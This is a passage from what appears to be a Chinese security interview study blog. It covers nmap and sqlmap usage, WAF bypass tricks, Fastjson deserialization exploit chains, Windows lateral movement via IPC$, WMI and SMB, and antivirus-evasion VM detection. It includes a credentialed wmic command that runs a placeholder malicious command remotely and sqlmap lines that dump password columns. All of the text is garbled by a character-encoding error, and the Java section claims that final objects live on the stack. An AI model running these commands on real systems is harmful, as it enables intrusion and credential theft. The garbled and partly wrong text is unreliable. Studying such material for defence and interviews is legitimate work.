ã€‚</p><ul><li><strong>æ­£ç¡®é…ç½®Nginx</strong>ï¼šç¡®ä¿Nginxçš„é…ç½®æ­£ç¡®ï¼Œé¿å…é”™è¯¯åœ°è§£æè¯·æ±‚çš„URIã€‚</li><li><strong>é™åˆ¶æ–‡ä»¶ç±»å‹</strong>ï¼šåœ¨Nginxé…ç½®ä¸­é™åˆ¶å¯ä»¥è§£æçš„æ–‡ä»¶ç±»å‹ï¼Œé¿å…ä¸å¿…è¦çš„æ–‡ä»¶è¢«å½“ä½œè„šæœ¬æ‰§è¡Œã€‚</li><li><strong>å‡çº§ç‰ˆæœ¬</strong>ï¼šåŠæ—¶å‡çº§Nginxåˆ°æœ€æ–°ç‰ˆæœ¬ï¼Œä»¥è·å–æœ€æ–°çš„å®‰å…¨ä¿®å¤ã€‚<br>æ–‡ä»¶è§£ææ¼æ´åœ¨IISã€Apacheã€Nginxç­‰WebæœåŠ¡å™¨ä¸­éƒ½æœ‰å¯èƒ½å‡ºç°ï¼Œå…¶åŸç†ä¸»è¦æ˜¯æœåŠ¡å™¨åœ¨è§£ææ–‡ä»¶æ—¶çš„ç‰¹æ®Šè¡Œä¸ºè¢«æ”»å‡»è€…åˆ©ç”¨ã€‚é˜²å¾¡æªæ–½ä¸»è¦åŒ…æ‹¬ä¸¥æ ¼æ–‡ä»¶ä¸Šä¼ éªŒè¯ã€æ­£ç¡®é…ç½®æœåŠ¡å™¨ã€å‡çº§åˆ°æœ€æ–°ç‰ˆæœ¬ç­‰ï¼Œä»¥ç¡®ä¿æœåŠ¡å™¨çš„å®‰å…¨æ€§ã€‚</li></ul><p>ä»¥ä¸‹æ˜¯ç½‘ç»œå®‰å…¨é¢è¯•å®˜è§†è§’ä¸‹å¯¹nmapã€msfã€sqlmapå¸¸è§å‘½ä»¤ï¼Œä»¥åŠJavaä¸­finalå’Œstaticå…³é”®å­—çš„ç”¨é€”åŠåŒºåˆ«çš„è¯¦ç»†è§£ç­”ï¼š</p><h3 id="nmapå¸¸è§å‘½ä»¤"><a href="#nmapå¸¸è§å‘½ä»¤" class="headerlink" title="nmapå¸¸è§å‘½ä»¤"></a>nmapå¸¸è§å‘½ä»¤</h3><table><thead><tr><th>å‘½ä»¤</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>nmap -sP 192.168.1.0/24</code></td><td>æ‰«æå±€åŸŸç½‘å†…åœ¨çº¿è®¾å¤‡çš„IPåœ°å€</td></tr><tr><td><code>nmap -sS 192.168.1.1 -p 1-1000</code></td><td>å¯¹æŒ‡å®šIPè¿›è¡ŒåŠå¼€å¼TCPæ‰«æï¼Œæ£€æµ‹1-1000ç«¯å£å¼€æ”¾æƒ…å†µ</td></tr><tr><td><code>nmap -sV 192.168.1.1</code></td><td>æ¢æµ‹ç›®æ ‡ä¸»æœºå¼€æ”¾ç«¯å£å¯¹åº”çš„æœåŠ¡åŠå…¶ç‰ˆæœ¬ä¿¡æ¯</td></tr><tr><td><code>nmap -O 192.168.1.1</code></td><td>å°è¯•è¯†åˆ«ç›®æ ‡ä¸»æœºçš„æ“ä½œç³»ç»Ÿç±»å‹</td></tr><tr><td><code>nmap -sC 192.168.1.1</code></td><td>ä½¿ç”¨é»˜è®¤è„šæœ¬å¯¹ç›®æ ‡ä¸»æœºè¿›è¡Œæ‰«æï¼Œå¯è·å–æ›´å¤šåº”ç”¨æœåŠ¡ä¿¡æ¯</td></tr><tr><td><code>nmap -A 192.168.1.1</code></td><td>å¯ç”¨é«˜çº§æ‰«ææ¨¡å¼ï¼ŒåŒ…å«æœåŠ¡ç‰ˆæœ¬æ¢æµ‹ã€æ“ä½œç³»ç»Ÿæ£€æµ‹å’Œè„šæœ¬æ‰«æ</td></tr></tbody></table><h3 id="sqlmapå¸¸è§å‘½ä»¤"><a href="#sqlmapå¸¸è§å‘½ä»¤" class="headerlink" title="sqlmapå¸¸è§å‘½ä»¤"></a>sqlmapå¸¸è§å‘½ä»¤</h3><table><thead><tr><th>å‘½ä»¤</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>sqlmap.py -u &quot;http://example.com/page?id=1&quot;</code></td><td>å¯¹æŒ‡å®šURLä¸­çš„å‚æ•°idè¿›è¡ŒSQLæ³¨å…¥æ£€æµ‹</td></tr><tr><td><code>sqlmap.py -u &quot;http://example.com/page?id=1&quot; --dbs</code></td><td>æ£€æµ‹ç›®æ ‡æ˜¯å¦å­˜åœ¨SQLæ³¨å…¥æ¼æ´ï¼Œå¹¶æšä¸¾æ‰€æœ‰æ•°æ®åº“</td></tr><tr><td><code>sqlmap.py -u &quot;http://example.com/page?id=1&quot; -D dbname --tables</code></td><td>åœ¨æŒ‡å®šæ•°æ®åº“dbnameä¸­æšä¸¾æ‰€æœ‰æ•°æ®è¡¨</td></tr><tr><td><code>sqlmap.py -u &quot;http://example.com/page?id=1&quot; -D dbname -T tbname --columns</code></td><td>æšä¸¾æŒ‡å®šæ•°æ®åº“dbnameä¸­è¡¨tbnameçš„æ‰€æœ‰åˆ—</td></tr><tr><td><code>sqlmap.py -u &quot;http://example.com/page?id=1&quot; -D dbname -T tbname -C &quot;username,password&quot; --dump</code></td><td>å¯¼å‡ºæŒ‡å®šè¡¨ä¸­åˆ—usernameå’Œpasswordçš„æ•°æ®</td></tr></tbody></table><h3 id="Javaä¸­finalå…³é”®å­—çš„ç”¨é€”"><a href="#Javaä¸­finalå…³é”®å­—çš„ç”¨é€”" class="headerlink" title="Javaä¸­finalå…³é”®å­—çš„ç”¨é€”"></a>Javaä¸­finalå…³é”®å­—çš„ç”¨é€”</h3><ol><li><strong>ä¿®é¥°å˜é‡</strong>ï¼šå½“finalä¿®é¥°ä¸€ä¸ªå˜é‡æ—¶ï¼Œè¯¥å˜é‡çš„å€¼åœ¨åˆå§‹åŒ–åä¸å¯æ”¹å˜ã€‚è¿™é€šå¸¸ç”¨äºå®šä¹‰å¸¸é‡ï¼Œä¾‹å¦‚<code>final double PI = 3.14;</code>ï¼Œä¿è¯PIçš„å€¼åœ¨ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­ä¸ä¼šè¢«ä¿®æ”¹ã€‚</li><li><strong>ä¿®é¥°æ–¹æ³•</strong>ï¼šfinalä¿®é¥°çš„æ–¹æ³•ä¸èƒ½è¢«å­ç±»é‡å†™ã€‚ä¾‹å¦‚ï¼Œ<code>public final void display();</code>ï¼Œç¡®ä¿æ‰€æœ‰å­ç±»å¿…é¡»æŒ‰ç…§çˆ¶ç±»å®šä¹‰çš„æ–¹å¼å®ç°è¯¥æ–¹æ³•ï¼Œä¿æŒç‰¹å®šåŠŸèƒ½çš„ä¸€è‡´æ€§ã€‚</li><li><strong>ä¿®é¥°ç±»</strong>ï¼šfinalä¿®é¥°çš„ç±»ä¸èƒ½è¢«ç»§æ‰¿ã€‚å¦‚<code>final class MyClass &#123;&#125;</code>ï¼Œé˜²æ­¢å…¶ä»–ç±»ç»§æ‰¿MyClassï¼Œç¡®ä¿å…¶å†…éƒ¨å®ç°ç»†èŠ‚ä¸è¢«å¤–éƒ¨è®¿é—®å’Œä¿®æ”¹ï¼Œå¢å¼ºå°è£…æ€§å’Œå®‰å…¨æ€§ã€‚</li></ol><h3 id="Javaä¸­staticå…³é”®å­—çš„ç”¨é€”"><a href="#Javaä¸­staticå…³é”®å­—çš„ç”¨é€”" class="headerlink" title="Javaä¸­staticå…³é”®å­—çš„ç”¨é€”"></a>Javaä¸­staticå…³é”®å­—çš„ç”¨é€”</h3><ol><li><strong>ä¿®é¥°å˜é‡</strong>ï¼šstaticä¿®é¥°çš„å˜é‡å±äºç±»ï¼Œä¸å±äºç±»çš„ä»»ä½•å¯¹è±¡ã€‚æ‰€æœ‰å¯¹è±¡å…±äº«åŒä¸€ä¸ªstaticå˜é‡ï¼Œä¾‹å¦‚<code>static int count = 0;</code>ï¼Œç”¨äºè®°å½•åˆ›å»ºå¯¹è±¡çš„æ•°é‡ï¼Œæ¯ä¸ªå¯¹è±¡å¯¹è¯¥å˜é‡çš„ä¿®æ”¹éƒ½ä¼šå½±å“å…¶ä»–å¯¹è±¡ã€‚</li><li><strong>ä¿®é¥°æ–¹æ³•</strong>ï¼šstaticä¿®é¥°çš„æ–¹æ³•å±äºç±»ï¼Œå¯é€šè¿‡ç±»åç›´æ¥è°ƒç”¨ï¼Œæ— éœ€åˆ›å»ºå¯¹è±¡ã€‚ä¾‹å¦‚<code>public static void main(String[] args)</code>ï¼Œæ˜¯Javaç¨‹åºçš„å…¥å£æ–¹æ³•ï¼Œä¸ä¾èµ–ä»»ä½•å¯¹è±¡å­˜åœ¨ã€‚</li><li><strong>ä¿®é¥°ä»£ç å—</strong>ï¼šstaticä»£ç å—åœ¨ç±»åŠ è½½æ—¶æ‰§è¡Œï¼Œç”¨äºåˆå§‹åŒ–ç±»çš„èµ„æºæˆ–è¿›è¡Œä¸€äº›å¿…è¦çš„é¢„å¤„ç†æ“ä½œï¼Œç¡®ä¿ç±»åœ¨ä½¿ç”¨å‰å®Œæˆç‰¹å®šçš„åˆå§‹åŒ–ä»»åŠ¡ã€‚</li></ol><h3 id="finalå’Œstaticçš„åŒºåˆ«"><a href="#finalå’Œstaticçš„åŒºåˆ«" class="headerlink" title="finalå’Œstaticçš„åŒºåˆ«"></a>finalå’Œstaticçš„åŒºåˆ«</h3><table><thead><tr><th>åŒºåˆ«ç»´åº¦</th><th>final</th><th>static</th></tr></thead><tbody><tr><td><strong>ä¿®é¥°å¯¹è±¡</strong></td><td>å¯ä¿®é¥°å˜é‡ã€æ–¹æ³•ã€ç±»</td><td>ä¸»è¦ä¿®é¥°å˜é‡ã€æ–¹æ³•ã€ä»£ç å—</td></tr><tr><td><strong>ç”Ÿå‘½å‘¨æœŸ</strong></td><td>finalå˜é‡ä¸€æ—¦èµ‹å€¼ä¸å¯æ”¹å˜ï¼›finalæ–¹æ³•å’Œç±»çš„å®šä¹‰åœ¨ç¨‹åºè¿è¡ŒæœŸé—´å›ºå®š</td><td>staticå˜é‡å’Œæ–¹æ³•éšç±»åŠ è½½è€Œå­˜åœ¨ï¼Œä¸ä¾èµ–å¯¹è±¡ï¼›staticä»£ç å—åœ¨ç±»åŠ è½½æ—¶æ‰§è¡Œä¸€æ¬¡</td></tr><tr><td><strong>å†…å­˜åˆ†é…</strong></td><td>finalä¿®é¥°çš„å¯¹è±¡åœ¨æ ˆä¸­åˆ†é…å†…å­˜ï¼Œéµå¾ªæ­£å¸¸å˜é‡çš„å†…å­˜ç®¡ç†</td><td>staticä¿®é¥°çš„å¯¹è±¡åœ¨æ–¹æ³•åŒºï¼ˆé™æ€åŒºï¼‰åˆ†é…å†…å­˜ï¼Œç‹¬ç«‹äºå¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸ</td></tr><tr><td><strong>è®¿é—®æ–¹å¼</strong></td><td>finalå˜é‡éœ€é€šè¿‡å¯¹è±¡è®¿é—®ï¼ˆé™¤éæ˜¯ç±»å˜é‡ï¼‰ï¼›finalæ–¹æ³•é€šè¿‡å¯¹è±¡æˆ–ç±»åè°ƒç”¨ï¼›finalç±»åªèƒ½é€šè¿‡ç±»åå¼•ç”¨</td><td>staticå˜é‡å’Œæ–¹æ³•å¯é€šè¿‡ç±»åç›´æ¥è®¿é—®ï¼Œæ— éœ€å¯¹è±¡ï¼›staticä»£ç å—ç”±JVMè‡ªåŠ¨è°ƒç”¨</td></tr></tbody></table><p>ä»¥ä¸‹æ˜¯å…³äºWAFç»•è¿‡ã€äº‘WAFç»•è¿‡ã€Fastjsonååºåˆ—åŒ–ä¸Javaååºåˆ—åŒ–çš„åŒºåˆ«ã€Fastjsoné«˜ç‰ˆæœ¬æ”»å‡»æ–¹æ³•ä»¥åŠåˆ©ç”¨é“¾çš„è¯¦ç»†è§£ç­”ï¼š</p><h3 id="WAFç»•è¿‡æ–¹æ³•"><a href="#WAFç»•è¿‡æ–¹æ³•" class="headerlink" title="WAFç»•è¿‡æ–¹æ³•"></a>WAFç»•è¿‡æ–¹æ³•</h3><ol><li><strong>è¯·æ±‚æ–¹å¼å˜æ¢</strong>ï¼šå°†GETè¯·æ±‚æ”¹ä¸ºPOSTè¯·æ±‚ï¼Œæˆ–è€…å°†POSTè¯·æ±‚æ”¹ä¸ºGETè¯·æ±‚ï¼Œç»•è¿‡WAFå¯¹ç‰¹å®šè¯·æ±‚æ–¹å¼çš„æ£€æµ‹ã€‚</li><li><strong>Content-Typeå˜æ¢</strong>ï¼šä¿®æ”¹è¯·æ±‚çš„Content-Typeï¼Œå¦‚ä»<code>application/x-www-form-urlencoded</code>æ”¹ä¸º<code>multipart/form-data</code>ï¼Œä½¿WAFæ— æ³•æ­£ç¡®è§£æå’Œæ£€æµ‹è¯·æ±‚å†…å®¹ã€‚</li><li><strong>å‚æ•°æ±¡æŸ“</strong>ï¼šé€šè¿‡åœ¨è¯·æ±‚ä¸­æ·»åŠ å¤šä¸ªç›¸åŒåç§°çš„å‚æ•°ï¼Œå¹²æ‰°WAFçš„å‚æ•°è§£æå’Œæ£€æµ‹é€»è¾‘ã€‚</li><li><strong>å¤§å°å†™å˜å½¢</strong>ï¼šåˆ©ç”¨WAFå¯¹å¤§å°å†™æ•æ„Ÿçš„ç‰¹ç‚¹ï¼Œå°†æ•æ„Ÿå…³é”®è¯è¿›è¡Œå¤§å°å†™å˜æ¢ï¼Œå¦‚å°†<code>or</code>å˜ä¸º<code>Or</code>ã€<code>OR</code>ç­‰ã€‚</li><li><strong>ç­‰ä»·æ›¿æ¢</strong>ï¼šå°†æ•æ„Ÿæ“ä½œç¬¦è¿›è¡Œç­‰ä»·æ›¿æ¢ï¼Œå¦‚å°†<code>and</code>æ›¿æ¢ä¸º<code>&amp;&amp;</code>ï¼Œ<code>or</code>æ›¿æ¢ä¸º<code>||</code>ã€‚</li><li><strong>æ³¨é‡Šç»•è¿‡</strong>ï¼šåœ¨SQLæ³¨å…¥ç­‰åœºæ™¯ä¸­ï¼Œä½¿ç”¨æ³¨é‡Šç¬¦ï¼ˆå¦‚<code>/* */</code>ã€<code>#</code>ï¼‰å°†æ•æ„Ÿè¯­å¥åˆ†éš”ï¼Œç»•è¿‡WAFçš„è§„åˆ™æ£€æµ‹ã€‚</li><li><strong>URLç¼–ç </strong>ï¼šå¯¹æ•æ„Ÿå­—ç¬¦è¿›è¡ŒURLç¼–ç ï¼Œå¦‚å°†<code>&#39;</code>ç¼–ç ä¸º<code>%27</code>ï¼Œ<code>/</code>ç¼–ç ä¸º<code>%2f</code>ç­‰ï¼Œä½¿WAFæ— æ³•ç›´æ¥è¯†åˆ«ã€‚</li><li><strong>ç©ºå­—èŠ‚ç»•è¿‡</strong>ï¼šåœ¨è¯·æ±‚ä¸­æ’å…¥ç©ºå­—èŠ‚ï¼ˆ<code>%00</code>ï¼‰ï¼Œä½¿WAFåœ¨å¤„ç†æ—¶åœæ­¢è§£æåç»­å†…å®¹ï¼Œä»è€Œç»•è¿‡æ£€æµ‹ã€‚</li></ol><h3 id="äº‘WAFç»•è¿‡æ–¹æ³•"><a href="#äº‘WAFç»•è¿‡æ–¹æ³•" class="headerlink" title="äº‘WAFç»•è¿‡æ–¹æ³•"></a>äº‘WAFç»•è¿‡æ–¹æ³•</h3><ol><li><strong>ä¼ªé€ å¤´éƒ¨ä¿¡æ¯</strong>ï¼šé€šè¿‡ä¿®æ”¹è¯·æ±‚å¤´éƒ¨çš„<code>X-Forwarded-For</code>å­—æ®µï¼Œä¼ªé€ IPåœ°å€ä¸ºå¯ä¿¡åœ°å€ï¼ˆå¦‚<code>127.0.0.1</code>ï¼‰ï¼Œä½¿äº‘WAFè¯¯è®¤ä¸ºæ˜¯åˆæ³•è¯·æ±‚ã€‚</li><li><strong>å¯»æ‰¾æºç«™</strong>ï¼šé’ˆå¯¹äº‘WAFéƒ¨ç½²çš„ç½‘ç«™ï¼Œå¯»æ‰¾å…¶çœŸå®æºç«™IPï¼Œç›´æ¥å¯¹æºç«™å‘èµ·æ”»å‡»ï¼Œç»•è¿‡äº‘WAFçš„é˜²æŠ¤ã€‚</li><li><strong>åˆ©ç”¨åŒç½‘æ®µ</strong>ï¼šåˆ©ç”¨ä¸ç›®æ ‡æœåŠ¡å™¨åŒç½‘æ®µçš„ä¸»æœºè¿›è¡Œæ”»å‡»ï¼Œä½¿æµé‡ä¸ç»è¿‡äº‘WAFçš„é˜²æŠ¤åŒºåŸŸã€‚</li></ol><h3 id="Fastjsonååºåˆ—åŒ–ä¸Javaååºåˆ—åŒ–çš„åŒºåˆ«"><a href="#Fastjsonååºåˆ—åŒ–ä¸Javaååºåˆ—åŒ–çš„åŒºåˆ«" class="headerlink" title="Fastjsonååºåˆ—åŒ–ä¸Javaååºåˆ—åŒ–çš„åŒºåˆ«"></a>Fastjsonååºåˆ—åŒ–ä¸Javaååºåˆ—åŒ–çš„åŒºåˆ«</h3><ul><li><strong>åºåˆ—åŒ–æœºåˆ¶</strong>ï¼š<ul><li><strong>Fastjson</strong>ï¼šFastjsonæ˜¯é˜¿é‡Œå·´å·´å¼€å‘çš„ä¸€ä¸ªè½»é‡çº§Javaåº“ï¼Œç”¨äºå°†Javaå¯¹è±¡è½¬æ¢ä¸ºJSONæ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œä»¥åŠå°†JSONå­—ç¬¦ä¸²è§£æä¸ºJavaå¯¹è±¡ã€‚å®ƒé€šè¿‡<code>JSON.toJSONString()</code>æ–¹æ³•è¿›è¡Œåºåˆ—åŒ–ï¼Œé€šè¿‡<code>JSON.parseObject()</code>æˆ–<code>JSON.parse()</code>æ–¹æ³•è¿›è¡Œååºåˆ—åŒ–ã€‚</li><li><strong>Javaååºåˆ—åŒ–</strong>ï¼šJavaè‡ªå¸¦çš„åºåˆ—åŒ–æœºåˆ¶é€šè¿‡<code>java.io.Serializable</code>æ¥å£å®ç°ï¼Œå°†å¯¹è±¡çš„çŠ¶æ€ä¿¡æ¯è½¬æ¢ä¸ºå¯ä»¥å­˜å‚¨æˆ–ä¼ è¾“çš„å½¢å¼ï¼Œå†åœ¨å¦ä¸€ç«¯é‡æ–°è¿˜åŸä¸ºå¯¹è±¡ã€‚</li></ul></li><li><strong>æ¼æ´äº§ç”ŸåŸç†</strong>ï¼š<ul><li><strong>Fastjson</strong>ï¼šFastjsonåœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œé€šè¿‡<code>@type</code>å‚æ•°æŒ‡å®šç±»çš„ç±»å‹ï¼Œå¹¶è°ƒç”¨è¯¥ç±»çš„æ„é€ æ–¹æ³•ã€<code>set</code>å’Œ<code>get</code>æ–¹æ³•ï¼Œå¦‚æœè¿™äº›æ–¹æ³•ä¸­å­˜åœ¨å¯è¢«åˆ©ç”¨çš„ä»£ç ï¼Œå°±å¯èƒ½å¯¼è‡´ååºåˆ—åŒ–æ¼æ´ã€‚</li><li><strong>Javaååºåˆ—åŒ–</strong>ï¼šJavaååºåˆ—åŒ–æ¼æ´é€šå¸¸æ˜¯ç”±äºåœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„åºåˆ—åŒ–æ•°æ®ï¼Œè§¦å‘ç›®æ ‡ç±»ä¸­çš„<code>readObject()</code>ç­‰æ–¹æ³•ä¸­çš„æ¼æ´ä»£ç ï¼Œä»è€Œæ‰§è¡Œä»»æ„ä»£ç ã€‚</li></ul></li><li><strong>åˆ©ç”¨æ–¹å¼</strong>ï¼š<ul><li><strong>Fastjson</strong>ï¼šæ”»å‡»è€…é€šè¿‡æ„é€ åŒ…å«æ¶æ„<code>@type</code>å‚æ•°çš„JSONå­—ç¬¦ä¸²ï¼Œä½¿Fastjsonåœ¨ååºåˆ—åŒ–æ—¶è§¦å‘æ¼æ´ã€‚</li><li><strong>Javaååºåˆ—åŒ–</strong>ï¼šæ”»å‡»è€…æ„é€ æ¶æ„çš„åºåˆ—åŒ–å¯¹è±¡ï¼Œé€šè¿‡ç½‘ç»œä¼ è¾“æˆ–æ–‡ä»¶ä¸Šä¼ ç­‰æ–¹å¼ä¼ é€’ç»™ç›®æ ‡ç³»ç»Ÿï¼Œç›®æ ‡ç³»ç»Ÿåœ¨ååºåˆ—åŒ–æ—¶è§¦å‘æ¼æ´ã€‚</li></ul></li></ul><h3 id="Fastjsoné«˜ç‰ˆæœ¬æ”»å‡»æ–¹æ³•"><a href="#Fastjsoné«˜ç‰ˆæœ¬æ”»å‡»æ–¹æ³•" class="headerlink" title="Fastjsoné«˜ç‰ˆæœ¬æ”»å‡»æ–¹æ³•"></a>Fastjsoné«˜ç‰ˆæœ¬æ”»å‡»æ–¹æ³•</h3><ul><li><strong>åˆ©ç”¨Autotypeæœºåˆ¶</strong>ï¼šåœ¨Fastjsonçš„æŸäº›é«˜ç‰ˆæœ¬ä¸­ï¼Œè™½ç„¶é»˜è®¤å…³é—­äº†AutotypeåŠŸèƒ½ï¼Œä½†å¯ä»¥é€šè¿‡è®¾ç½®<code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true)</code>æ¥å¼€å¯ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œæ„é€ åŒ…å«æ¶æ„<code>@type</code>å‚æ•°çš„JSONå­—ç¬¦ä¸²ï¼Œä½¿Fastjsonåœ¨ååºåˆ—åŒ–æ—¶æ‰§è¡Œä»»æ„ä»£ç ã€‚</li><li><strong>åˆ©ç”¨å…¶ä»–ååºåˆ—åŒ–æ¼æ´</strong>ï¼šå³ä½¿AutotypeåŠŸèƒ½è¢«ç¦ç”¨ï¼ŒFastjsonåœ¨å¤„ç†å¤æ‚å¯¹è±¡æ—¶ä»å¯èƒ½å­˜åœ¨å…¶ä»–ååºåˆ—åŒ–æ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ç ”ç©¶Fastjsonçš„ååºåˆ—åŒ–é€»è¾‘ï¼Œå¯»æ‰¾æ–°çš„åˆ©ç”¨ç‚¹ã€‚</li></ul><h3 id="Fastjsonä¸å‡ºç½‘çš„æ”»å‡»æ–¹æ³•"><a href="#Fastjsonä¸å‡ºç½‘çš„æ”»å‡»æ–¹æ³•" class="headerlink" title="Fastjsonä¸å‡ºç½‘çš„æ”»å‡»æ–¹æ³•"></a>Fastjsonä¸å‡ºç½‘çš„æ”»å‡»æ–¹æ³•</h3><p><a href="https://blog.csdn.net/2301_80064376/article/details/146132528">é«˜ç‰ˆæœ¬åˆ©ç”¨æ–¹æ³•</a><br><a href="https://xz.aliyun.com/news/11938">https://xz.aliyun.com/news/11938</a><br><a href="https://www.freebuf.com/articles/web/365680.html">https://www.freebuf.com/articles/web/365680.html</a><br><a href="https://xz.aliyun.com/news/14309">https://xz.aliyun.com/news/14309</a></p><h3 id="Fastjsonå¸¸è§åˆ©ç”¨é“¾"><a href="#Fastjsonå¸¸è§åˆ©ç”¨é“¾" class="headerlink" title="Fastjsonå¸¸è§åˆ©ç”¨é“¾"></a>Fastjsonå¸¸è§åˆ©ç”¨é“¾</h3><ul><li><strong>JRMPåˆ©ç”¨é“¾</strong>ï¼šæ”»å‡»è€…é€šè¿‡æ„é€ åŒ…å«<code>@type</code>ä¸º<code>java.rmi.server.UnicastRemoteObject</code>çš„JSONå­—ç¬¦ä¸²ï¼Œè§¦å‘JRMPï¼ˆJava Remote Method Protocolï¼‰ååºåˆ—åŒ–æ¼æ´ï¼Œè¿æ¥åˆ°æ”»å‡»è€…æ§åˆ¶çš„RMIæœåŠ¡å™¨ï¼Œä¸‹è½½å¹¶æ‰§è¡Œæ¶æ„ä»£ç ã€‚</li><li><strong>CommonsCollectionsåˆ©ç”¨é“¾</strong>ï¼šåˆ©ç”¨<code>org.apache.commons.collections</code>åŒ…ä¸­çš„<code>Transformer</code>ç±»çš„ååºåˆ—åŒ–æ¼æ´ï¼Œç»“åˆFastjsonçš„ååºåˆ—åŒ–è¿‡ç¨‹ï¼Œæ‰§è¡Œä»»æ„ä»£ç ã€‚</li><li><strong>å…¶ä»–åˆ©ç”¨é“¾</strong>ï¼šæ ¹æ®ç›®æ ‡ç³»ç»Ÿä¸­ä½¿ç”¨çš„å…¶ä»–ç¬¬ä¸‰æ–¹åº“æˆ–ç»„ä»¶çš„ååºåˆ—åŒ–æ¼æ´ï¼Œç»“åˆFastjsonçš„ç‰¹æ€§ï¼Œæ„é€ ç›¸åº”çš„åˆ©ç”¨é“¾ã€‚</li></ul><h3 id="å†…ç½‘æ¸—é€æ¨ªå‘æ‰‹æ®µ"><a href="#å†…ç½‘æ¸—é€æ¨ªå‘æ‰‹æ®µ" class="headerlink" title="å†…ç½‘æ¸—é€æ¨ªå‘æ‰‹æ®µ"></a>å†…ç½‘æ¸—é€æ¨ªå‘æ‰‹æ®µ</h3><h4 id="1-IPC-æ¨ªå‘ç§»åŠ¨"><a href="#1-IPC-æ¨ªå‘ç§»åŠ¨" class="headerlink" title="1. IPC$æ¨ªå‘ç§»åŠ¨"></a>1. IPC$æ¨ªå‘ç§»åŠ¨</h4><ul><li><strong>åŸç†</strong>ï¼šIPC$æ˜¯Windowsç³»ç»Ÿä¸­ç”¨äºè¿›ç¨‹é—´é€šä¿¡çš„å…±äº«å‘½åç®¡é“ï¼Œé€šè¿‡139æˆ–445ç«¯å£è¿›è¡Œé€šä¿¡ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨IPC$è¿æ¥ï¼Œå°†æ¶æ„ä»£ç æˆ–å·¥å…·ä¼ è¾“åˆ°ç›®æ ‡ä¸»æœºï¼Œå¹¶åœ¨ç›®æ ‡ä¸»æœºä¸Šæ‰§è¡Œå‘½ä»¤ã€‚</li><li><strong>æ“ä½œç¤ºä¾‹</strong>ï¼š<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">52</span>.<span class="number">136</span>\ipc$ &quot;password&quot; /user:&quot;username&quot;</span><br></pre></td></tr></table></figure></li></ul><h4 id="2-WMIæ¨ªå‘ç§»åŠ¨"><a href="#2-WMIæ¨ªå‘ç§»åŠ¨" class="headerlink" title="2. WMIæ¨ªå‘ç§»åŠ¨"></a>2. WMIæ¨ªå‘ç§»åŠ¨</h4><ul><li><strong>åŸç†</strong>ï¼šWMIï¼ˆWindows Management Instrumentationï¼‰æ˜¯Windowsç³»ç»Ÿä¸­ç”¨äºç®¡ç†æœ¬åœ°å’Œè¿œç¨‹è®¡ç®—æœºçš„å·¥å…·ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨WMIåœ¨è¿œç¨‹ä¸»æœºä¸Šæ‰§è¡Œå‘½ä»¤ã€‚</li><li><strong>æ“ä½œç¤ºä¾‹</strong>ï¼š<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:<span class="number">192</span>.<span class="number">168</span>.<span class="number">52</span>.<span class="number">136</span> /user:username /password:password process <span class="keyword">call</span> create &quot;<span class="built_in">cmd</span> /c malicious_command&quot;</span><br></pre></td></tr></table></figure></li></ul><h4 id="3-SMBæ¨ªå‘ç§»åŠ¨"><a href="#3-SMBæ¨ªå‘ç§»åŠ¨" class="headerlink" title="3. SMBæ¨ªå‘ç§»åŠ¨"></a>3. SMBæ¨ªå‘ç§»åŠ¨</h4><ul><li><strong>åŸç†</strong>ï¼šSMBï¼ˆServer Message Blockï¼‰åè®®ç”¨äºæ–‡ä»¶å…±äº«å’Œæ‰“å°æœåŠ¡ï¼Œé€šè¿‡445ç«¯å£è¿›è¡Œé€šä¿¡ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨SMBåè®®åœ¨å†…ç½‘ä¸­ä¼ æ’­æ¶æ„è½¯ä»¶æˆ–æ‰§è¡Œè¿œç¨‹å‘½ä»¤ã€‚</li><li><strong>æ“ä½œç¤ºä¾‹</strong>ï¼š<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">52</span>.<span class="number">136</span>\share &quot;password&quot; /user:&quot;username&quot;</span><br></pre></td></tr></table></figure></li></ul><h3 id="å…æ€ç›¸å…³ï¼šåˆ¤æ–­æ˜¯å¦æ˜¯è™šæ‹Ÿæœºç¯å¢ƒ"><a href="#å…æ€ç›¸å…³ï¼šåˆ¤æ–­æ˜¯å¦æ˜¯è™šæ‹Ÿæœºç¯å¢ƒ" class="headerlink" title="å…æ€ç›¸å…³ï¼šåˆ¤æ–­æ˜¯å¦æ˜¯è™šæ‹Ÿæœºç¯å¢ƒ"></a>å…æ€ç›¸å…³ï¼šåˆ¤æ–­æ˜¯å¦æ˜¯è™šæ‹Ÿæœºç¯å¢ƒ</h3><ul><li><strong>æŸ¥çœ‹ä¸»æœºåå’Œè¿›ç¨‹</strong>ï¼šé€šè¿‡æŸ¥çœ‹ä¸»æœºåå’Œè¿›ç¨‹ä¿¡æ¯ï¼Œå¯ä»¥åˆæ­¥åˆ¤æ–­æ˜¯å¦å¤„äºè™šæ‹Ÿæœºç¯å¢ƒã€‚è™šæ‹Ÿæœºç¯å¢ƒä¸­çš„ä¸»æœºåå’Œè¿›ç¨‹å¯èƒ½åŒ…å«ç‰¹å®šçš„è™šæ‹Ÿæœºæ 